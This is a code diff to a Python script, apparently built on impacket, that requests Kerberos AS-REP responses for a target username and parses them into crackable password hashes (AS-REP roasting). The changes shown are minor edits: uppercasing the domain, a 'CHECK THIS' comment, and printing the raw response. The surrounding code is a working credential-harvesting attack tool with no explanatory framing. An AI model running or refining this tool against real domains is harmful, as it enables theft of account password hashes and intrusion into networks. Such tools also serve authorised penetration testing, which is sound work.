@@ -30,7 +30,7 @@ def getTGT(userName, domain_name, kdcHost, requestPAC=True):
 
     asReq = AS_REQ()
 
-    domain = domain_name
+    domain = domain_name.upper()
     serverName = Principal('krbtgt/%s' % domain, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
 
     pacRequest = KERB_PA_PAC_REQUEST()
@@ -66,6 +66,7 @@ def getTGT(userName, domain_name, kdcHost, requestPAC=True):
     reqBody['rtime'] = KerberosTime.to_asn1(now)
     reqBody['nonce'] = random.getrandbits(31)
 
+    # CHECK THIS
     supportedCiphers = (16,17,18,19)
 
     seq_set_iter(reqBody, 'etype', supportedCiphers)
@@ -125,6 +126,7 @@ def parseASREPHash(response, username, domain):
 
     return hash_str
 
+
 if __name__ == '__main__':
     parser = OptionParser()
     parser.add_option('-u', '--user', help='Target username')
@@ -150,6 +152,8 @@ if __name__ == '__main__':
     try:
         logging.info('Requesting AS-REP for user: %s' % username)
         response = getTGT(username, domain, dc_ip)
+
+        print(response)
 
         hash_str = parseASREPHash(response, username, domain)
         if hash_str:
